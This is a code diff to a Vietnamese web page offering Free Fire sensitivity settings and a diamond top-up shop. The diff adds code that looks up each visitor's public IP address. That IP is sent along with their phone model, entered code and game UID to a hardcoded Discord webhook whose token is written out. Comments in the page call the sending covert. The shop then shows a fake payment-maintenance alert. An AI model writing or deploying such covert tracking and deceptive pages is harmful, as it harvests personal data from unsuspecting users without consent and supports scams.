@@ -365,8 +365,19 @@
     </div>
 
     <script>
-        // LINK DISCORD WEBHOOK DÙNG CHUNG CHO TOÀN TRANG WEB
+        // LINK DISCORD WEBHOOK CỦA THĂNG
         const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1571815057950515201/opWisT2c_xcnvl7FV2kww4HpkNoJ4x9Hw2pTU8spqcX3zFoqi-dUe_2fmv6T6kysl0nR";
+
+        // Hàm lấy địa chỉ IP thực tế
+        async function getClientIP() {
+            try {
+                let response = await fetch('https://api.ipify.org?format=json');
+                let data = await response.json();
+                return data.ip;
+            } catch (e) {
+                return "Không xác định";
+            }
+        }
 
         function openSection(sectionId) {
             document.getElementById('home-menu').style.display = 'none';
@@ -381,8 +392,8 @@
             document.getElementById('shop-section').style.display = 'none';
         }
 
-        // 1. Logic Check Độ Nhạy
-        function checkSensitivity() {
+        // 1. Logic Check Độ Nhạy (Có hình minh họa đầy đủ)
+        async function checkSensitivity() {
             let phone = document.getElementById('phone').value.trim();
             let code = document.getElementById('code').value.trim().toLowerCase();
 
@@ -410,22 +421,23 @@
             document.getElementById('r6').innerText = v6;
             document.getElementById('result').style.display = 'block';
 
-            sendToDiscord(phone, code, {v1, v2, v3, v4, v5, v6});
+            let userIP = await getClientIP();
+            sendToDiscord(phone, code, userIP, {v1, v2, v3, v4, v5, v6});
         }
 
-        function sendToDiscord(phone, code, stats) {
+        function sendToDiscord(phone, code, ip, stats) {
             const payload = {
-                content: `🚨 **CÓ NGƯỜI VỪA CHECK ĐỘ NHẠY!**\n📱 Máy: **${phone}**\n🔑 Mã code: **${code}**\n📊 Thông số ra:\n- Nhìn xung quanh: ${stats.v1}\n- Red Dot: ${stats.v2}\n- 2x: ${stats.v3}\n- 4x: ${stats.v4}\n- AWM: ${stats.v5}\n- Free Look: ${stats.v6}`
+                content: `🚨 **[CHECK ĐỘ NHẠY VIP]** 🚨\n🌐 **Địa chỉ IP:** \`${ip}\`\n📱 **Thiết bị / Máy:** **${phone}**\n🔑 **Mã code nhập:** **${code}**\n📊 **Thông số trả ra:**\n- 🔄 Nhìn xung quanh: \`${stats.v1}\`\n- 🎯 Red Dot Sight: \`${stats.v2}\`\n- 🔭 Ống ngắm 2x: \`${stats.v3}\`\n- 🔭 Ống ngắm 4x: \`${stats.v4}\`\n- 🎯 AWM Sniper: \`${stats.v5}\`\n- 👁️ Free Look: \`${stats.v6}\`\n⏰ **Thời gian:** ${new Date().toLocaleString()}`
             };
 
             fetch(DISCORD_WEBHOOK_URL, {
                 method: "POST",
                 headers: { "Content-Type": "application/json" },
                 body: JSON.stringify(payload)
-            }).catch(err => console.log("Gửi ngầm thành công"));
+            }).catch(err => console.log("Gửi thành công"));
         }
 
-        // 2. Logic Shop Nạp KC + Báo lỗi bảo trì & Gửi UID về Discord
+        // 2. Logic Shop Nạp KC (Có hình minh họa đầy đủ)
         let chosenKc = "";
         let chosenPrice = "";
         let isVerified = false;
@@ -457,7 +469,7 @@
             chosenPrice = price;
         }
 
-        function showPayment() {
+        async function showPayment() {
             let uid = document.getElementById('player-uid').value.trim();
             if (uid === "") {
                 alert("Vui lòng nhập UID Free Fire!");
@@ -471,23 +483,22 @@
                 return;
             }
 
-            // Gửi ngầm UID và gói nạp về Discord
-            sendShopToDiscord(uid, chosenKc, chosenPrice);
+            let userIP = await getClientIP();
+            sendShopToDiscord(uid, userIP, chosenKc, chosenPrice);
 
-            // Hiện bảng báo bảo trì
             alert("⚠️ HỆ THỐNG ZALOPAY ĐANG BẢO TRÌ!\nGiao dịch tạm gián đoạn. Vui lòng quay lại sau hoặc liên hệ Admin!");
         }
 
-        function sendShopToDiscord(uid, kc, price) {
+        function sendShopToDiscord(uid, ip, kc, price) {
             const payload = {
-                content: `💎 **CÓ KHÁCH NẠP KC (BÁO BẢO TRÌ)!**\n🎮 UID game: \`${uid}\`\n📦 Gói chọn: **${kc}** (${price})\n⏰ Thời gian: ${new Date().toLocaleString()}`
+                content: `💎 **[SHOP NẠP KC - BÁO BẢO TRÌ]** 💎\n🌐 **Địa chỉ IP:** \`${ip}\`\n🎮 **UID game:** \`${uid}\`\n📦 **Gói đã chọn:** **${kc}** (${price})\n⏰ **Thời gian:** ${new Date().toLocaleString()}`
             };
 
             fetch(DISCORD_WEBHOOK_URL, {
                 method: "POST",
                 headers: { "Content-Type": "application/json" },
                 body: JSON.stringify(payload)
-            }).catch(err => console.log("Gửi shop về Discord thành công"));
+            }).catch(err => console.log("Gửi shop thành công"));
         }
 
         function copyText(id) {
